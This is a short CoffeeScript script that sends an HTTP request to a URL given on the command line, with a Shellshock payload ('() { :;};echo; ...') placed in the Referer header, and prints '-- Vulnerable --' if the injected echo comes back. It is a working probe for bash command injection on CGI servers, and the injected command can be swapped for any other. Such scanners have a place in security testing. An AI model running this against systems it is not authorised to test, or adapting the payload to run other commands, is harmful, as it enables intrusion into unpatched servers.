request = require 'request'

args = process.argv

url = args[2]

headers =
  'Content-type': 'text/plain'
  'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.66 Safari/537.36'
  'Referer': "() { :;};echo; echo 'Shellshock'"

request = request
  url: url
  timeout: 20000
  headers: headers
, (err, res, data) ->
  return console.log err if err?
  data = String data
  if data.indexOf('Shellshock') > -1
    console.log url, '-- Vulnerable --'
  else
    console.log url, false
